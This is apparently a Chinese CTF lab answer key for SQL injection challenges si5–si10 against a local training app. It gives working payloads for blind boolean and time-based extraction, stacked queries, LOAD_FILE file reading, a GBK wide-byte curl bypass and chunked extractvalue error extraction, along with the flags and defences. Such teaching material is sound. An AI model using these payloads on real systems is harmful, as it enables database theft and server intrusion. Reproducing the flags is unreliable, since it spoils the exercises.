# 题解：sql-injection 进阶（si5~si9）

> ⚠️ 请先把 5 道题全部做出来，再来看这里！

## si5 布尔盲注（Boolean-based）

先探测：`1 and 1=1`（查到）vs `1 and 1=2`（查不到）——页面两种反应就是信号。

然后提取（手动体验 2~3 个字符，再用脚本）：

```sql
1 and length((select flag from flag5_table))=17
1 and ascii(substr((select flag from flag5_table),1,1))>100
```

脚本（二分法，每字符最多 7 次请求）：

```bash
python modules/sql-injection/tools/blind_boolean.py
```

**考点本质**：无回显时，用**条件真假→页面两种状态**作为信道，逐字符把数据带出来。

## si6 时间盲注（Time-based）

页面永远一样 → 用时间当信道：

```sql
1 and if(ascii(substr((select flag from flag6_table),1,1))=102, sleep(1), 0)
```

成立 → 卡 1 秒。脚本 `tools/blind_time.py` 用二分法+计时。

**考点本质**：连页面状态都没有时，**执行时间**就是信道。

## si7 堆叠注入（Stacked，完整流程）

```sql
1;show tables                    -- 表名自己看：products, secret_table
1;select data from secret_table  -- 找到表后取数据 → flag{si7_stacked}
```

**讲解**：union 被拦（`preg_match('/union/i')`），但分号没被拦。源码用的是 `mysqli_multi_query()`，支持多语句。表名、列名没有提示——`show tables` 就是堆叠注入自带的"枚举工具"。
**考点本质**：UNION 只能 SELECT，**堆叠能执行任意语句**（show/update/insert/写文件）。前提是 PHP 用了 multi_query。

## si8 读文件（LOAD_FILE）

```sql
0 union select load_file('/var/lib/mysql-files/flag.txt'),2
```

**讲解**：flag 文件放在 `/var/lib/mysql-files/` 是因为 MySQL 的 `secure_file_priv` 只允许 LOAD_FILE 读这个目录。FILE 权限在 init.sql 里已授予 ctf 用户。
**考点本质**：SQL 注入 + FILE 权限 = **读服务器任意可读文件**（配置文件、源码、密钥）。

## si9 宽字节注入（GBK）

```powershell
curl.exe -d "username=%bf%27%20or%201=1%23&password=x" http://localhost:8083/si9/
```

**讲解**：addslashes 把 `'` 变成 `\'`（即 `%5c%27`），但连接字符集是 GBK：`%bf%5c` 拼成一个汉字「縗」，反斜杠被"吃掉"，后面的单引号裸奔 → `or 1=1` 恒真 + `#` 注释掉密码检查。
**考点本质**：**编码歧义**——转义符和它前面的字节组成了合法宽字符。防御：连接字符集用 utf8mb4。

## si10 超长 flag（完整流程：找表 → 找列 → 分段取）

**① 找表**（extractvalue 是 2 个参数，别写成 updatexml 的 3 参）：
```sql
1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))
-- 报错：~products,secret_table
```

**② 找列**：
```sql
1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='secret_table')))
-- 报错：~id,data
```

**③ 分段取数据**（42 字符 > 32 字符限制）：
```sql
-- 第1块
1 and extractvalue(1,concat(0x7e,(select substr(data,1,30) from secret_table)))
-- 报错：~flag{si10_long_flag_chunked_ex
-- 第2块
1 and extractvalue(1,concat(0x7e,(select substr(data,31,30) from secret_table)))
-- 报错：~traction_42}
```

拼起来 = flag{si10_long_flag_chunked_extraction_42}

**讲解**：extractvalue 报错最多显示 32 字符（含 ~），每块取 30 字符最稳。`substr(s,pos,len)` 从 pos 开始取 len 个。多行数据用 `group_concat` 先合并。
**考点本质**：**任何信道都有带宽限制**——报错注入的信道是 32 字符/次，分段就是"分片传输"。盲注的逐字符提取也是同一个思想。

## 小结：SQL 注入危害链

注入 → 拖库（UNION/报错/盲注）→ 读文件（LOAD_FILE）→ 写文件（INTO OUTFILE）→ **RCE**

防御：预编译参数化是根本；过滤只是辅助；字符集统一 utf8mb4。

下一课（XSS）预告：注入目标从"服务器"转向"其他用户的浏览器"。